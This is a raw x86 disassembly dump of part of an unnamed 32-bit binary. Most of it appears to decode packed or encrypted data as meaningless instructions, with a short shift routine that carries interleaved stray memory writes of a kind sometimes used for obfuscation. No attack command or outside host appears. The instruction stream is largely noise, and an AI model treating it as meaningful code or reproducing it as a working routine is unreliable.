  419a4b:	xchg   DWORD PTR cs:[esi+0x56],ebx
  419a4f:	hlt    
  419a50:	add    DWORD PTR [edi-0x5393b850],eax
  419a56:	neg    BYTE PTR [ecx+ecx*1+0x48fabf4c]
  419a5d:	mov    dl,ah
  419a5f:	jecxz  0x419a82
  419a61:	cld    
  419a62:	inc    esp
  419a63:	mov    esi,0x4d5791cc
  419a68:	mov    ?,WORD PTR [ebp-0x698ff51c]
  419a6e:	push   0x1c
  419a70:	inc    BYTE PTR [ebp+ebp*1-0x6330161e]
  419a77:	idiv   DWORD PTR [eax+0x390555dd]
  419a7d:	jg     0x419a4c
  419a7f:	(bad)  
  419a80:	adc    al,0xb9
  419a82:	loopne 0x419b01
  419a84:	pop    edi
  419a85:	mov    BYTE PTR [ebx],bh
  419a87:	int3   
  419a88:	sub    eax,0x2c1fa7c1
  419a8d:	in     eax,0xf2
  419a8f:	sbb    bh,dl
  419a91:	cwde   
  419a92:	cmp    eax,0x69152412
  419a97:	xchg   esp,eax
  419a98:	mov    ebx,0x73ff5f3f
  419a9d:	not    bl
  419a9f:	ror    DWORD PTR [eax-0x20],1
  419aa2:	mov    BYTE PTR [eax],al
  419aa4:	cli    
  419aa5:	in     al,dx
  419aa6:	and    BYTE PTR [edx+0x57],ch
  419aa9:	faddp  st(0),st
  419aab:	jecxz  0x419af4
  419aad:	clc    
  419aae:	cmp    ebx,DWORD PTR [esi+0x4d]
  419ab1:	sub    al,0x9a
  419ab3:	push   esi
  419ab4:	lock push edx
  419ab6:	cmp    al,0x9
  419ab8:	retf   0x2e21
  419abb:	pop    ecx
  419abc:	arpl   WORD PTR [eax+eax*4+0x4f],si
  419ac0:	ficom  WORD PTR [ebp+0x19e697d9]
  419ac6:	retf   
  419ac7:	pusha  
  419ac8:	xlat   BYTE PTR ds:[ebx]
  419ac9:	mov    al,0x87
  419acb:	pop    esp
  419acc:	mov    BYTE PTR [eax-0x66],bl
  419acf:	adc    ebp,eax
  419ad1:	shl    DWORD PTR [edi+0x31],0xb
  419ad5:	loope  0x419b1d
  419ad7:	in     eax,0x91
  419ad9:	pop    DWORD PTR [esi]
  419adb:	adc    edi,esi
  419add:	sbb    cl,dh
  419adf:	or     al,0x1f
  419ae1:	imul   ecx,DWORD PTR [edi],0xffffffac
  419ae4:	pop    ebx
  419ae5:	inc    ecx
  419ae6:	sbb    BYTE PTR [ecx-0x2a9ced4a],al
  419aec:	aas    
  419aed:	push   edx
  419aee:	call   0xa7214187
  419af3:	sub    eax,DWORD PTR [esi]
  419af5:	mov    al,ds:0x62df0c90
  419afa:	cmc    
  419afb:	rcl    edi,1
  419afd:	ins    DWORD PTR es:[edi],dx
  419afe:	mov    esp,0x82e758b4
  419b03:	ins    DWORD PTR es:[edi],dx
  419b04:	mov    edx,ecx
  419b06:	mov    ds:0x29a3f475,eax
  419b0b:	mov    edx,0xf4be9be
  419b10:	adc    eax,DWORD PTR [ecx-0x1d274eba]
  419b16:	mov    cl,0x7d
  419b18:	test   BYTE PTR [ecx-0x5965d014],dl
  419b1e:	es mov edi,0x426361f8
  419b24:	lds    ecx,FWORD PTR [eax-0x45]
  419b27:	mov    esp,0xfec18c7b
  419b2c:	ins    DWORD PTR es:[edi],dx
  419b2d:	sbb    DWORD PTR [ebx-0x54],edx
  419b30:	jbe    0x419ad2
  419b32:	sbb    BYTE PTR ds:0x40fc0aba,ah
  419b38:	inc    esi
  419b39:	lock pop edi
  419b3b:	xor    DWORD PTR [edx],ebx
  419b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3e:	fst    DWORD PTR [esi-0x5]
  419b41:	ins    BYTE PTR es:[edi],dx
  419b42:	jbe    0x419b82
  419b44:	in     al,0xc1
  419b46:	int    0x6b
  419b48:	lods   al,BYTE PTR ds:[esi]
  419b49:	mov    bl,0x5
  419b4b:	jns    0x419af3
  419b4d:	mov    ds:0x90beeca9,al
  419b52:	icebp  
  419b53:	jp     0x419b45
  419b55:	js     0x419b50
  419b57:	int    0x61
  419b59:	xchg   BYTE PTR [ecx],bh
  419b5b:	or     eax,0x74b9e5b1
  419b60:	cmp    BYTE PTR [ebx+0x20],0xae
  419b64:	adc    BYTE PTR [esi+0x75fe5ecb],ah
  419b6a:	scas   al,BYTE PTR es:[edi]
  419b6b:	pop    edx
  419b6c:	je     0x419ba8
  419b6e:	out    dx,eax
  419b6f:	jmp    0x24c9f611
  419b74:	sub    cl,BYTE PTR [esi+0x3a5e97cc]
  419b7a:	or     ebx,ebx
  419b7c:	dec    esi
  419b7d:	fist   WORD PTR [ebp+0x76]
  419b80:	push   ebx
  419b81:	mov    cs,WORD PTR [eax]
  419b83:	mov    BYTE PTR [eax-0x7f194d46],bl
  419b89:	int    0x6e
  419b8b:	adc    bh,BYTE PTR [esi]
  419b8d:	out    dx,eax
  419b8e:	jo     0x419b81
  419b90:	jb     0x419b5f
  419b92:	fisttp DWORD PTR [ecx+0x45a31764]
  419b98:	mov    ecx,0x15da44e9
  419b9d:	jb     0x419b8a
  419b9f:	sub    DWORD PTR [esi+eax*1-0x21],esi
  419ba3:	cmp    ebp,DWORD PTR [ebp-0x72]
  419ba6:	loopne 0x419bd4
  419ba8:	aaa    
  419ba9:	cmc    
  419baa:	ins    DWORD PTR es:[edi],dx
  419bab:	(bad)  
  419bac:	or     DWORD PTR [edx+0x12b311c9],eax
  419bb2:	mov    dh,BYTE PTR [edi]
  419bb4:	lods   al,BYTE PTR ds:[esi]
  419bb5:	push   ecx
  419bb6:	cmp    BYTE PTR [esi-0x60],bh
  419bb9:	pop    esi
  419bba:	mov    dh,0x6e
  419bbc:	push   edi
  419bbd:	cmp    al,0x29
  419bbf:	sub    DWORD PTR [ecx],ecx
  419bc1:	sti    
  419bc2:	test   al,0x74
  419bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bc5:	into   
  419bc6:	xor    DWORD PTR ds:0x7aec1976,0x36
  419bcd:	fst    DWORD PTR [edi]
  419bcf:	or     ebx,DWORD PTR [ecx-0x77eb5de3]
  419bd5:	xchg   BYTE PTR [esp+eiz*4],dl
  419bd8:	xor    bl,BYTE PTR [edx]
  419bda:	adc    al,0x21
  419bdc:	xchg   ebx,eax
  419bdd:	in     al,0x79
  419bdf:	cdq    
  419be0:	das    
  419be1:	sub    DWORD PTR [eax],0x7424960d
  419be7:	add    DWORD PTR [esi-0x15],ecx
  419bea:	inc    edx
  419beb:	jmp    0x85e9:0x56533683
  419bf2:	add    eax,0xf8e40000
  419bf7:	inc    esi
  419bf8:	scas   eax,DWORD PTR es:[edi]
  419bf9:	sbb    ch,BYTE PTR [eax]
  419bfb:	push   esp
  419bfc:	mov    eax,0x72b8fca1
  419c01:	mov    edx,0x21aeba9c
  419c06:	cmp    ecx,DWORD PTR [esi+edx*1]
  419c09:	cmp    eax,0xa9161604
  419c0e:	daa    
  419c0f:	jg     0x419c3e
  419c11:	pop    edi
  419c12:	test   BYTE PTR [ebp+0x58455b53],al
  419c18:	mov    esi,0xdf3cff1f
  419c1d:	fucomip st,st(4)
  419c1f:	(bad)  
  419c20:	xchg   ebp,eax
  419c21:	nop
  419c22:	fidiv  DWORD PTR [ecx]
  419c24:	add    eax,0x1b2c8517
  419c29:	push   ds
  419c2a:	popf   
  419c2b:	fld    QWORD PTR [ebp+0x55]
  419c2e:	outs   dx,BYTE PTR ds:[esi]
  419c2f:	lods   al,BYTE PTR ds:[esi]
  419c30:	lods   eax,DWORD PTR ds:[esi]
  419c31:	loope  0x419c76
  419c33:	add    esi,DWORD PTR [edx]
  419c35:	imul   esp,DWORD PTR [edx+0x17],0xffffffe0
  419c39:	jp     0x419c4c
  419c3b:	int3   
  419c3c:	mov    eax,0x48e102d5
  419c41:	jae    0x419c0e
  419c43:	inc    ebx
  419c44:	fidivr DWORD PTR [esi+0x5cf069f7]
  419c4a:	mov    ah,0xa6
  419c4c:	adc    eax,0x55f66c2a
  419c51:	out    dx,al
  419c52:	push   ebx
  419c53:	inc    edx
  419c54:	jo     0x419c7a
  419c56:	leave  
  419c57:	inc    ebx
  419c58:	fstp   QWORD PTR [edx]
  419c5a:	sub    BYTE PTR [edi+0x3],0x9c
  419c5e:	add    bh,BYTE PTR [edx+0xe]
  419c61:	ss xor dh,0x29
  419c65:	dec    eax
  419c66:	cmp    eax,0x2f28550b
  419c6b:	loop   0x419c82
  419c6d:	mov    dh,0xaf
  419c6f:	popa   
  419c70:	mov    ebx,DWORD PTR [edx+0x2f]
  419c73:	jmp    0x5a9f:0x40ce4c49
  419c7a:	push   ebx
  419c7b:	mov    al,0x63
  419c7d:	mov    ah,0xbe
  419c7f:	mov    ah,0xa9
  419c81:	xor    BYTE PTR [edx+0xa8969f4],bl
  419c87:	xchg   ebx,eax
  419c88:	lock inc edi
  419c8a:	ftst   
  419c8c:	jnp    0x419cc8
  419c8e:	sbb    ebp,esi
  419c90:	dec    ecx
  419c91:	rcl    esi,0xee
  419c94:	mov    edx,0x85215ada
  419c99:	popf   
  419c9a:	iret   
  419c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c9d:	lods   al,BYTE PTR ds:[esi]
  419c9e:	mov    WORD PTR [bx+0x15],ss
  419ca2:	pusha  
  419ca3:	pop    esp
  419ca4:	mov    ebp,0xb92069ff
  419ca9:	mov    BYTE PTR [ebp+0x34],0xe9
  419cad:	in     eax,0xf5
  419caf:	mov    esp,0x9f534757
  419cb4:	repz adc ecx,ecx
  419cb7:	ret    0x39a8
  419cba:	aad    0xcf
  419cbc:	int3   
  419cbd:	test   dl,ah
  419cbf:	lock ret 0xe131
  419cc3:	sahf   
  419cc4:	lahf   
  419cc5:	mov    esp,0xd2d71f0c
  419cca:	jno    0x419ccd
  419ccc:	xor    cl,dl
  419cce:	mov    al,ds:0xffb15e05
  419cd3:	cs add eax,0x7027fe57
  419cd9:	push   0xfc8898f8
  419cde:	adc    DWORD PTR [ebp-0x5a1bd01],ebx
  419ce4:	das    
  419ce5:	xor    BYTE PTR [eax+0x5db9802f],dl
  419ceb:	loopne 0x419c78
  419ced:	repnz mov ch,0xde
  419cf0:	mov    ah,0x7d
  419cf2:	or     BYTE PTR [edi-0x5e538e0e],ah
  419cf8:	jns    0x419d21
  419cfa:	aad    0x8d
  419cfc:	repnz mov eax,0xefb00e18
  419d02:	pop    ds
  419d03:	mov    bh,0xdc
  419d05:	and    DWORD PTR [ebx+eiz*2+0x69],0x160f3878
  419d0d:	xor    BYTE PTR [eax+0x6e22835d],0xf2
  419d14:	mov    bh,0x84
  419d16:	jg     0x419d87
  419d18:	scas   eax,DWORD PTR es:[edi]
  419d19:	add    DWORD PTR [ecx-0x8],edi
  419d1c:	cdq    
  419d1d:	(bad)  
  419d1e:	(bad)  
  419d1f:	lahf   
  419d20:	cwde   
  419d21:	lods   al,BYTE PTR ds:[esi]
  419d22:	pop    esi
  419d23:	lods   eax,DWORD PTR ds:[si]
  419d25:	jo     0x419d49
  419d27:	push   0x342a7260
  419d2c:	pop    edx
  419d2d:	lea    edx,[esi]
  419d2f:	sub    ch,bl
  419d31:	shl    DWORD PTR [edi+0x25],1
  419d34:	gs inc ebp
  419d36:	xor    al,0x19
  419d38:	jl     0x419db1
  419d3a:	rcl    DWORD PTR [esi],1
  419d3c:	cs sbb eax,0xdec34571
  419d42:	ins    BYTE PTR es:[edi],dx
  419d43:	fidivr DWORD PTR [ebx-0x61]
  419d46:	ficom  DWORD PTR ds:0x81a90b10
  419d4c:	mov    ds:0xa82b1624,al
  419d51:	cdq    
  419d52:	(bad)  
  419d53:	call   0xbb7a07ac
  419d58:	jb     0x419dba
  419d5a:	sub    esp,DWORD PTR [edi]
  419d5c:	adc    cl,dl
  419d5e:	scas   al,BYTE PTR es:[edi]
  419d5f:	js     0x419d6b
  419d61:	lds    ebx,FWORD PTR [ebx]
  419d63:	xor    DWORD PTR [eax-0x46],0xffffffe8
  419d67:	mov    ecx,ebp
  419d69:	rcr    BYTE PTR [edx-0x5e7f695f],1
  419d6f:	cmp    BYTE PTR [ebx-0x7a236366],ch
  419d75:	adc    DWORD PTR [ebp+0x21],0x7b
  419d79:	mov    ?,WORD PTR [edx+0x51c60d97]
  419d7f:	out    0xc1,eax
  419d81:	ja     0x419d62
  419d83:	lods   eax,DWORD PTR ds:[esi]
  419d84:	adc    BYTE PTR [esi+0x4f],cl
  419d87:	jle    0x419d69
  419d89:	das    
  419d8a:	pop    ds
  419d8b:	cld    
  419d8c:	jmp    0xc6b3:0xd198eb4f
  419d93:	int3   
  419d94:	mov    cl,0x90
  419d96:	inc    edx
  419d97:	cmp    bh,BYTE PTR [edi]
  419d99:	sub    eax,0xc4fbbd66
  419d9e:	pushf  
  419d9f:	xchg   ecx,eax
  419da0:	sbb    al,0x34
  419da2:	jl     0x419d61
  419da4:	jge    0x419d9e
  419da6:	and    al,0x63
  419da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419daa:	sub    DWORD PTR [ebp-0x6e],0x65
  419dae:	stc    
  419daf:	icebp  
  419db0:	xchg   ebx,eax
  419db1:	xchg   ebp,eax
  419db2:	push   gs
  419db4:	or     ch,BYTE PTR [esi+0x36d4dc7e]
  419dba:	cmp    al,ch
  419dbc:	push   ds
  419dbd:	cmp    esi,eax
  419dbf:	push   ecx
  419dc0:	fnsave [eax+0x30327661]
  419dc6:	mov    esp,0x98405e04
  419dcb:	xchg   DWORD PTR [edi],ebx
  419dcd:	sub    DWORD PTR [ebx+0x5b77a1b2],edx
  419dd3:	cmp    BYTE PTR [ebp+0x5880451],ch
  419dd9:	ret    
  419dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ddb:	ret    
  419ddc:	fisub  DWORD PTR [ecx+0x73a8191c]
  419de2:	or     BYTE PTR [edi+0x58],ah
  419de5:	xlat   BYTE PTR ds:[ebx]
  419de6:	lds    ebx,FWORD PTR [edi+0x7d]
  419de9:	push   0xffffff9a
  419deb:	inc    esi
  419dec:	sbb    ah,dh
  419dee:	push   eax
  419def:	mov    dh,0x56
  419df1:	xor    al,0x7d
  419df3:	fisttp DWORD PTR [eax]
  419df5:	cmp    ah,al
  419df7:	pushf  
  419df8:	xor    dh,dl
  419dfa:	push   es
  419dfb:	fidivr DWORD PTR [ebx]
  419dfd:	ds sahf 
  419dff:	cmp    BYTE PTR es:[ecx-0x56],ah
  419e03:	ins    BYTE PTR es:[edi],dx
  419e04:	mov    eax,ds:0xe9b028a9
  419e09:	jb     0x419e83
  419e0b:	imul   esp,DWORD PTR [ecx],0x65b46023
  419e11:	in     al,dx
  419e12:	adc    dl,BYTE PTR [eax]
  419e14:	push   ds
  419e15:	push   ss
  419e16:	pop    edi
  419e17:	mov    ds:0xc4cd710b,al
  419e1c:	mov    esi,?
  419e1e:	mov    esp,0x651e8164
  419e23:	mov    ds:0x18a2e11f,al
  419e28:	pop    edx
  419e29:	(bad)  
  419e2a:	push   cs
  419e2b:	sar    DWORD PTR [edi],cl
  419e2d:	sbb    BYTE PTR [ebp+0x52],0x51
  419e31:	mov    edx,0x394904d2
  419e36:	icebp  
  419e37:	jge    0x419dc6
  419e39:	cmp    ch,BYTE PTR [ecx+ecx*1]
  419e3c:	aas    
  419e3d:	std    
  419e3e:	inc    esi
  419e3f:	jns    0x419e6e
  419e41:	cmp    BYTE PTR [edx-0x55],ch
  419e44:	xchg   BYTE PTR [esi+0x409cc458],dl
  419e4a:	loop   0x419e66
  419e4c:	xor    bl,BYTE PTR [edi+0xc]
  419e4f:	or     al,dl
  419e51:	push   ds
  419e52:	dec    edx
  419e53:	cmp    bh,al
  419e55:	rcl    dh,cl
  419e57:	mov    al,0x6b
  419e59:	retf   
  419e5a:	adc    dh,bl
  419e5c:	push   ds
  419e5d:	loope  0x419e05
  419e5f:	xchg   ecx,eax
  419e60:	cli    
  419e61:	imul   edi,ebp,0xc8a8da8f
  419e67:	sub    ebp,DWORD PTR [ecx-0x2f]
  419e6a:	loope  0x419e65
  419e6c:	push   ecx
  419e6d:	inc    ebx
  419e6e:	jmp    esi
  419e70:	xchg   edx,eax
  419e71:	sbb    eax,0x775e75dc
  419e76:	dec    esp
  419e77:	inc    edx
  419e78:	push   esi
  419e79:	push   edi
  419e7a:	mov    ebp,0xc2571bae
  419e7f:	pop    esi
  419e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e81:	int    0xb1
  419e83:	pop    ds
  419e84:	jo     0x419e46
  419e86:	sbb    al,0xdf
  419e88:	adc    ah,BYTE PTR [ebx]
  419e8a:	jecxz  0x419edb
  419e8c:	push   esi
  419e8d:	ins    DWORD PTR es:[edi],dx
  419e8e:	xchg   edx,eax
  419e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e90:	inc    edx
  419e91:	cmc    
  419e92:	mov    ch,0x63
  419e94:	sar    DWORD PTR [eax+0x2e],cl
  419e97:	jl     0x419e39
  419e99:	adc    eax,DWORD PTR [ebp-0x53e20902]
  419e9f:	mov    cl,BYTE PTR [eax]
  419ea1:	rol    DWORD PTR [edx+0x31009e42],0xc0
  419ea8:	mov    edi,0xd4784497
  419ead:	adc    al,BYTE PTR [edi*1+0x75783867]
  419eb4:	fsub   DWORD PTR ds:0xfb3d4436
  419eba:	mov    ecx,0x59f31cd8
  419ebf:	jbe    0x419f0a
  419ec1:	popf   
  419ec2:	push   cs
  419ec3:	lahf   
  419ec4:	xchg   ebx,eax
  419ec5:	cmc    
  419ec6:	enter  0x247d,0x6
  419eca:	stos   DWORD PTR es:[edi],eax
  419ecb:	pop    edx
  419ecc:	loope  0x419ec2
  419ece:	or     al,0x15
  419ed0:	jne    0x419ec7
  419ed2:	loope  0x419f43
  419ed4:	pop    esi
  419ed5:	es jo  0x419e9f
  419ed8:	jp     0x419e8e
  419eda:	and    BYTE PTR [ebp-0x673b7902],dh
  419ee0:	jo     0x419f52
  419ee2:	stos   BYTE PTR es:[edi],al
  419ee3:	sbb    BYTE PTR [eax+0x9e9371e],dh
  419ee9:	enter  0x89a4,0xa2
  419eed:	ins    DWORD PTR es:[edi],dx
  419eee:	or     eax,0x63d2c3f9
  419ef3:	aaa    
  419ef4:	and    bl,cl
  419ef6:	lahf   
  419ef7:	push   es
  419ef8:	sbb    dl,BYTE PTR [ecx]
  419efa:	xor    dh,cl
  419efc:	sub    ecx,ebp
  419efe:	pop    esi
  419eff:	jecxz  0x419f51
  419f01:	cwde   
  419f02:	pop    ebx
  419f03:	idiv   DWORD PTR [edx]
  419f05:	inc    ecx
  419f06:	jmp    0x6a132834
  419f0b:	scas   eax,DWORD PTR es:[edi]
  419f0c:	mov    dl,0xb1
  419f0e:	inc    edi
  419f10:	sbb    DWORD PTR [edx],eax
  419f12:	adc    al,bl
  419f14:	mov    ds:0xd4c49b48,al
  419f19:	jo     0x419ed3
  419f1b:	dec    ebp
  419f1c:	fwait
  419f1d:	mov    eax,0x76ef1ed6
  419f22:	xchg   BYTE PTR [ecx-0x61bec337],dh
  419f28:	scas   al,BYTE PTR es:[edi]
  419f29:	and    ecx,DWORD PTR [ebp+ebx*4+0x53]
  419f2d:	(bad)  [edx]
  419f2f:	adc    DWORD PTR [esi+ebp*4-0x57],edx
  419f33:	xchg   ebx,eax
  419f34:	scas   al,BYTE PTR es:[edi]
  419f35:	push   esp
  419f36:	loop   0x419f1a
  419f38:	or     BYTE PTR [ecx],bl
  419f3a:	stc    
  419f3b:	call   0x1b41d594
  419f40:	and    BYTE PTR [esi-0x3e],0xb3
  419f44:	retf   
  419f45:	and    cl,BYTE PTR [ecx+0x39145123]
  419f4b:	jp     0x419fc8
  419f4d:	ins    BYTE PTR es:[edi],dx
  419f4e:	dec    ebp
  419f4f:	add    dh,BYTE PTR [ebx]
  419f51:	jmp    0x419ee8
  419f53:	or     dh,BYTE PTR [edx*4+0x735dc884]
  419f5a:	jbe    0x419f50
  419f5c:	es imul edx,ebx,0x3bf0852a
  419f63:	fisttp DWORD PTR [esi+0x4d539ff7]
  419f69:	inc    eax
  419f6a:	pop    eax
  419f6b:	stos   BYTE PTR es:[edi],al
  419f6c:	rol    esp,0xc3
  419f6f:	stos   DWORD PTR es:[edi],eax
  419f70:	push   0x26a69119
  419f75:	imul   ebp,DWORD PTR [ecx-0x2f460a40],0x5f
  419f7c:	loopne 0x419f5a
  419f7e:	fst    DWORD PTR [edx]
  419f80:	adc    bl,BYTE PTR [ecx-0x509d691d]
  419f86:	ss int3 
  419f88:	call   0x9a7e302e
  419f8d:	sbb    al,0xe2
  419f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f90:	(bad)  
  419f91:	cmp    DWORD PTR [eax-0x6f],edi
  419f94:	pop    eax
  419f95:	xor    al,0xe0
  419f97:	pop    esi
  419f98:	pop    ss
  419f99:	test   DWORD PTR [ebx-0x6],edx
  419f9c:	arpl   bx,cx
  419f9e:	or     DWORD PTR ds:0x21c41016,ebp
  419fa4:	xchg   BYTE PTR [edx],ah
  419fa6:	test   al,0x10
  419fa8:	xchg   BYTE PTR ds:0xb1e93e74,ah
  419fae:	and    BYTE PTR [eax],dl
  419fb0:	cmp    edi,eax
  419fb2:	test   DWORD PTR [edi],ecx
  419fb4:	inc    dh
  419fb6:	fwait
  419fb7:	mov    esp,0xead2bb95
  419fbc:	xchg   edi,eax
  419fbd:	(bad)  
  419fbf:	leave  
  419fc0:	div    DWORD PTR [ecx]
  419fc2:	je     0x419f8d
  419fc4:	cmp    DWORD PTR [edi],eax
  419fc6:	or     eax,0x7ef49610
  419fcb:	test   BYTE PTR [ebx-0x26d4f6c2],bl
  419fd1:	cmp    BYTE PTR [ebx+0x25],bl
  419fd4:	fstp   st(5)
  419fd6:	int3   
  419fd7:	popf   
  419fd8:	xchg   ebx,eax
  419fd9:	mov    dl,0x95
  419fdb:	iret   
  419fdc:	aas    
  419fdd:	jnp    0x41a00b
  419fdf:	xor    BYTE PTR [esi],bl
  419fe1:	dec    ebp
  419fe2:	aas    
  419fe3:	sub    dh,cl
  419fe5:	bt     DWORD PTR [ecx+esi*1+0x4e5ab8b7],esp
  419fed:	add    eax,0xb2430713
  419ff2:	mov    WORD PTR [eax+0x8],fs
  419ff5:	ja     0x419fbc
  419ff7:	mov    ebx,0xd97417a5
  419ffc:	sbb    dh,dh
  419ffe:	push   0xe6565151
  41a003:	outs   dx,DWORD PTR ds:[esi]
  41a004:	cmp    ah,BYTE PTR [edi-0x29]
  41a007:	gs test al,0x3
  41a00a:	aam    0x1c
  41a00c:	aam    0x88
  41a00e:	and    DWORD PTR [ecx+edi*1+0x48],0xe1180b39
  41a016:	mov    eax,ds:0x570c5fd0
  41a01b:	out    dx,al
  41a01c:	jbe    0x41a023
  41a01e:	rol    BYTE PTR [edx+eiz*1-0x28f6f0ce],1
  41a025:	xchg   ebp,eax
  41a026:	pop    edi
  41a027:	cs mov eax,0xe84a229f
  41a02d:	push   es
  41a02e:	(bad)  
  41a030:	sti    
  41a031:	into   
  41a032:	fcmove st,st(4)
  41a034:	mov    al,0x5
  41a036:	fs call 0x2dc2fc2d
  41a03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a03d:	aad    0x79
  41a03f:	xlat   BYTE PTR ds:[ebx]
  41a040:	enter  0x980b,0xe5
  41a044:	xor    dh,dl
  41a046:	mov    fs,WORD PTR [edx+0x1088715d]
  41a04c:	in     al,0x8e
  41a04e:	xor    ebx,0x31
  41a051:	rcr    BYTE PTR [ebx+0x75],1
  41a054:	push   ds
  41a055:	ds push esp
  41a057:	out    0x1d,al
  41a059:	inc    ecx
  41a05a:	xor    eax,0xb4de2b6
  41a05f:	cdq    
  41a060:	ss inc edi
  41a062:	sbb    edi,DWORD PTR gs:[edx+0x18]
  41a066:	ins    BYTE PTR es:[edi],dx
  41a067:	jp     0x41a00c
  41a069:	xchg   ebx,eax
  41a06a:	dec    edi
  41a06b:	jne    0x41a0cc
  41a06d:	psllq  mm7,QWORD PTR [edi]
  41a070:	in     eax,dx
  41a071:	jg     0x41a075
  41a073:	fwait
  41a074:	xor    al,0x8
  41a076:	(bad)  
  41a077:	(bad)  
  41a078:	xor    al,0x5d
  41a07a:	sbb    eax,0x4b61fcdf
  41a07f:	(bad)  
  41a080:	mov    ecx,0xf1d600ab
  41a085:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41a087:	enter  0x50b7,0x4c
  41a08b:	mov    dl,0x18
  41a08d:	int    0x4b
  41a08f:	in     al,dx
  41a090:	jo     0x41a10a
  41a092:	mov    bh,0x3c
  41a094:	xor    al,0xdf
  41a096:	pop    DWORD PTR [ebx]
  41a098:	mov    ds:0x694c5819,eax
  41a09d:	add    BYTE PTR [edi],ah
  41a09f:	xchg   esp,eax
  41a0a0:	jno    0x41a07c
  41a0a2:	repnz test BYTE PTR [ebp-0x2b33ae2f],0x1a
  41a0aa:	mov    ecx,0xa994fe5d
  41a0af:	adc    al,0x59
  41a0b1:	pop    eax
  41a0b2:	jmp    0x58320ba4
  41a0b7:	or     eax,0x354ea2b9
  41a0bc:	mov    edi,0x4bef17b2
  41a0c1:	int    0x2d
  41a0c3:	ss out dx,eax
  41a0c5:	xlat   BYTE PTR ds:[ebx]
  41a0c6:	xchg   esp,eax
  41a0c7:	test   eax,0x43112698
  41a0cc:	gs jae 0x41a14d
  41a0cf:	cmp    bl,BYTE PTR [ebx+0x6eb83af5]
  41a0d5:	leave  
  41a0d6:	mov    ds:0x137f38ce,eax
  41a0db:	sti    
  41a0dc:	push   es
  41a0dd:	std    
  41a0de:	ja     0x41a0e6
  41a0e0:	clc    
  41a0e1:	adc    eax,0xe379ca67
  41a0e6:	xor    ebx,DWORD PTR [esi]
  41a0e8:	cmp    esi,edx
  41a0ea:	int3   
  41a0eb:	or     al,0x6d
  41a0ed:	and    DWORD PTR [edi+0x2b],0x55
  41a0f1:	xchg   esi,eax
  41a0f2:	or     DWORD PTR [edx-0x29636c30],edx
  41a0f8:	out    dx,al
  41a0f9:	inc    esi
  41a0fa:	mov    ds:0x224d3535,al
  41a0ff:	cs out dx,al
  41a101:	xchg   esp,eax
  41a102:	xchg   DWORD PTR [ebx-0x7675ee27],ecx
  41a108:	xchg   ecx,eax
  41a109:	add    ebp,DWORD PTR [ecx-0x8180a9e]
  41a10f:	and    bh,BYTE PTR [edi-0xa]
  41a112:	imul   edx,ebp,0xfffffffa
  41a115:	dec    eax
  41a116:	lahf   
  41a117:	dec    esp
  41a118:	les    esi,FWORD PTR [ecx]
  41a11a:	scas   eax,DWORD PTR es:[edi]
  41a11b:	mov    ch,0xe2
  41a11d:	push   ss
  41a11e:	popa   
  41a11f:	cmp    esp,edx
  41a121:	leave  
  41a122:	mov    ah,0x63
  41a124:	sbb    dh,BYTE PTR [eax-0x496e82d7]
  41a12a:	hlt    
  41a12b:	mov    eax,0xfe620e2b
  41a130:	mov    ah,0x71
  41a132:	dec    edx
  41a133:	les    edi,FWORD PTR [eax*8+0x100dc404]
  41a13a:	packsswb mm3,QWORD PTR [ebx-0x39779eb4]
  41a141:	out    0xe9,al
  41a143:	fimul  DWORD PTR [eax]
  41a145:	xor    ah,BYTE PTR [ebp+0x48bfb4c1]
  41a14b:	sub    eax,0x6286059e
  41a150:	mov    ah,BYTE PTR [esi]
  41a152:	cmc    
  41a153:	cwde   
  41a154:	add    BYTE PTR [ebx+0x5b521e8],dh
  41a15a:	add    bh,cl
  41a15c:	in     eax,dx
  41a15d:	lods   eax,DWORD PTR ds:[esi]
  41a15e:	jnp    0x41a119
  41a160:	fisttp WORD PTR [ecx+0x7a7d83ac]
  41a166:	pop    edi
  41a167:	(bad)  
  41a168:	cmp    edi,ebx
  41a16a:	push   ecx
  41a16b:	fild   DWORD PTR [edx-0x32c183ff]
  41a171:	shl    BYTE PTR [ecx-0x4ad860d9],cl
  41a177:	mov    ds:0x13e8709b,al
  41a17c:	xor    DWORD PTR [eax],eax
  41a17e:	add    BYTE PTR [edi-0x37],bl
  41a181:	ret    0x1c
  41a184:	mov    DWORD PTR ds:0x4228ae,0x3cc2
  41a18e:	cmp    cl,0x40
  41a191:	mov    DWORD PTR ds:0x4228f6,0x571c
  41a19b:	jae    0x41a710
  41a1a1:	mov    DWORD PTR ds:0x42289a,0x49b8
  41a1ab:	cmp    cl,0x20
  41a1ae:	mov    DWORD PTR ds:0x4228b6,0x4a57
  41a1b8:	jae    0x41a1ce
  41a1be:	shrd   eax,edx,cl
  41a1c1:	mov    DWORD PTR ds:0x4229c2,0x6fa1
  41a1cb:	shr    edx,cl
  41a1cd:	ret    
  41a1ce:	neg    eax
  41a1d0:	mov    eax,edx
  41a1d2:	jmp    0x41a708
  41a1d7:	fldenv [eax+edi*4]
  41a1da:	inc    edx
  41a1db:	cmp    BYTE PTR [edx],dl
  41a1dd:	pop    ecx
  41a1de:	adc    al,0xa6
  41a1e0:	inc    esp
  41a1e1:	xor    al,0x68
  41a1e3:	das    
  41a1e4:	out    dx,eax
  41a1e5:	les    esi,FWORD PTR [edx+0x160c394e]
  41a1eb:	in     eax,0x4
  41a1ed:	push   ss
  41a1ee:	push   ss
  41a1ef:	jns    0x41a269
  41a1f1:	aaa    
  41a1f2:	fnsave [ebp+0x70]
  41a1f5:	mov    ds:0xde17dacf,al
  41a1fa:	ss pop es
  41a1fc:	xchg   ecx,eax
  41a1fd:	out    0xa,al
  41a1ff:	das    
  41a200:	jb     0x41a187
  41a202:	icebp  
  41a203:	pushf  
  41a204:	jae    0x41a243
  41a206:	das    
  41a207:	mov    al,0x6e
  41a209:	xor    BYTE PTR [edi+0x14],dh
